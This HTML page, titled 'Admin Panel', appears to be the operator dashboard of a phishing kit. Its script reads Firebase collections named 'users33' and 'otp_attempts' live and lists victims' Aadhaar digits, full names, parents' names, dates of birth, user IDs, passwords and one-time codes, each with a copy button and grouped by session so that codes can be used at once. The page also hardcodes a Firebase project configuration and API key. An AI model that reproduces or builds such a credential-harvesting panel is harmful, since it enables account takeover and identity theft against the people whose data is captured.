<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Panel - All / Grouped Data</title>
  <style>
    body { font-family: Arial, sans-serif; background: #f2f2f2; margin: 0; padding: 0; }
    header { background: #007BFF; color: white; padding: 15px; text-align: center; font-size: 24px; }
    .buttons { text-align: center; margin: 15px 0; }
    .buttons button { margin: 0 5px; padding: 8px 16px; cursor: pointer; border: none; border-radius: 5px; background: #007BFF; color: white; }
    .buttons button.active { background: #0056b3; }
    .container { padding: 20px; max-width: 1200px; margin: auto; overflow-y: auto; height: 80vh; }
    .session-block { background: white; margin-bottom: 20px; padding: 15px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); border: 2px solid #28a745; }
    .session-title { font-weight: bold; margin-bottom: 10px; font-size: 18px; }
    .data-item { background: #f9f9f9; margin-bottom: 10px; padding: 10px; border-radius: 5px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
    .data-item small { display: block; margin-top: 5px; color: gray; font-size: 12px; }
    .field { margin-bottom: 5px; display: flex; align-items: center; flex-wrap: nowrap; gap: 5px; }
    .field-name { width: 100px; font-weight: bold; }
    .field-value { flex: 1; }
    button.copy-btn { padding: 3px 8px; cursor: pointer; background: #28a745; color: white; border: none; border-radius: 5px; }
    button.copy-btn:hover { background: #218838; }
    .otp-field .field-value { color: #d63384; font-weight: bold; }
  </style>
</head>
<body>
<header>Admin</header>

<div class="buttons">
  <button id="allBtn" class="active">All Data</button>
  <button id="groupBtn">Grouped Data</button>
</div>

<div class="container" id="dataContainer"></div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
import { getFirestore, collection, query, orderBy, onSnapshot } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyD7kr-x5CJLdWGoj6r_MAPmhnJWe8Jc3oI",
  authDomain: "ss22-a96d3.firebaseapp.com",
  projectId: "ss22-a96d3",
  storageBucket: "ss22-a96d3.firebasestorage.app",
  messagingSenderId: "607942972170",
  appId: "1:607942972170:web:2e38b2d5410ff37f3960f3",
  measurementId: "G-KT1P0Q0FD0",
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const container = document.getElementById('dataContainer');

let allData = [];
let currentView = 'all';

// sessionMap stores sessionId => number
let sessionMap = {};
let nextSessionNumber = 1;

const fieldMap = {
  aadhaarLastDigits: "Add",
  fullName: "Name",
  fatherName: "F:Name",
  motherName: "M:Name",
  profilePassword: "PP",
  dateOfBirth: "DOB",
  userId: "UserId",
  password: "Paswrd",
  otp: "OTP"
};

// Merge snapshot and assign session numbers
function mergeAndSort(snapshot) {
  snapshot.forEach(doc => {
    const data = doc.data();
    data.id = doc.id;
    allData.push(data);

    const sess = data.sessionId || data.userId || "Unknown";

    // assign number if new session
    if (!sessionMap[sess]) {
      sessionMap[sess] = nextSessionNumber++;
    }
  });

  allData.sort((a,b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));
  render();
}

const usersQuery = query(collection(db, "users33"), orderBy("timestamp", "desc"));
onSnapshot(usersQuery, mergeAndSort);

const otpQuery = query(collection(db, "otp_attempts"), orderBy("timestamp", "desc"));
onSnapshot(otpQuery, mergeAndSort);

function render() {
  if(currentView==='all') renderAllData(allData);
  else renderGroupedData(allData);
}

function renderAllData(dataArray) {
  container.innerHTML="";
  dataArray.forEach(item=>{
    const itemDiv=document.createElement("div");
    itemDiv.className="data-item";

    const fields={...item};
    delete fields.sessionId; delete fields.page; delete fields.attempt;
    delete fields.timestamp; delete fields.id; delete fields.captcha;

    Object.keys(fields).forEach(key=>{
      if(!fieldMap[key]) return;
      const fieldDiv=document.createElement("div");
      fieldDiv.className="field";
      if(key==="otp") fieldDiv.classList.add("otp-field");

      const nameDiv=document.createElement("div");
      nameDiv.className="field-name";
      nameDiv.textContent=fieldMap[key]+":";

      const valueDiv=document.createElement("div");
      valueDiv.className="field-value";
      valueDiv.textContent=fields[key];

      const copyBtn=document.createElement("button");
      copyBtn.className="copy-btn";
      copyBtn.textContent="Copy";
      copyBtn.addEventListener("click", ()=>navigator.clipboard.writeText(fields[key]).then(()=>alert(`Copied: ${fields[key]}`)));

      fieldDiv.appendChild(nameDiv);
      fieldDiv.appendChild(valueDiv);
      fieldDiv.appendChild(copyBtn);
      itemDiv.appendChild(fieldDiv);
    });

    if(item.timestamp){
      const timeDiv=document.createElement("small");
      timeDiv.textContent=new Date(item.timestamp.seconds*1000).toLocaleString();
      itemDiv.appendChild(timeDiv);
    }

    container.appendChild(itemDiv);
  });
}

function renderGroupedData(dataArray) {
  const grouped = {};
  dataArray.forEach(item=>{
    const sess=item.sessionId || item.userId || "Unknown";
    if(!grouped[sess]) grouped[sess]=[];
    grouped[sess].push(item);
  });

  container.innerHTML="";

  // Sort sessions by newest timestamp first (so new sessions at top)
  const sessionsSorted = Object.keys(grouped).sort((a,b)=>{
    const latestA = grouped[a][0].timestamp?.seconds || 0;
    const latestB = grouped[b][0].timestamp?.seconds || 0;
    return latestB - latestA;
  });

  sessionsSorted.forEach(sess=>{
    const sessionDiv = document.createElement("div");
    sessionDiv.className = "session-block";

    const title = document.createElement("div");
    title.className = "session-title";
    title.textContent = `Session ${sessionMap[sess]} - ${sess}`; // number stays fixed
    sessionDiv.appendChild(title);

    grouped[sess].sort((a,b)=> (b.timestamp?.seconds||0) - (a.timestamp?.seconds||0));

    grouped[sess].forEach(item=>{
      const itemDiv=document.createElement("div");
      itemDiv.className="data-item";

      const fields={...item};
      delete fields.sessionId; delete fields.page; delete fields.attempt;
      delete fields.timestamp; delete fields.id; delete fields.captcha;

      Object.keys(fields).forEach(key=>{
        if(!fieldMap[key]) return;
        const fieldDiv=document.createElement("div");
        fieldDiv.className="field";
        if(key==="otp1") fieldDiv.classList.add("otp-field");

        const nameDiv=document.createElement("div");
        nameDiv.className="field-name";
        nameDiv.textContent=fieldMap[key]+":";

        const valueDiv=document.createElement("div");
        valueDiv.className="field-value";
        valueDiv.textContent=fields[key];

        const copyBtn=document.createElement("button");
        copyBtn.className="copy-btn";
        copyBtn.textContent="Copy";
        copyBtn.addEventListener("click", ()=>navigator.clipboard.writeText(fields[key]).then(()=>alert(`Copied: ${fields[key]}`)));

        fieldDiv.appendChild(nameDiv);
        fieldDiv.appendChild(valueDiv);
        fieldDiv.appendChild(copyBtn);
        itemDiv.appendChild(fieldDiv);
      });

      if(item.timestamp){
        const timeDiv=document.createElement("small");
        timeDiv.textContent=new Date(item.timestamp.seconds*1000).toLocaleString();
        itemDiv.appendChild(timeDiv);
      }

      sessionDiv.appendChild(itemDiv);
    });

    container.appendChild(sessionDiv);
  });
}

document.getElementById("allBtn").addEventListener("click", ()=>{
  currentView='all';
  document.getElementById("allBtn").classList.add("active");
  document.getElementById("groupBtn").classList.remove("active");
  render();
});

document.getElementById("groupBtn").addEventListener("click", ()=>{
  currentView='group';
  document.getElementById("groupBtn").classList.add("active");
  document.getElementById("allBtn").classList.remove("active");
  render();
});
</script>
</body>
</html>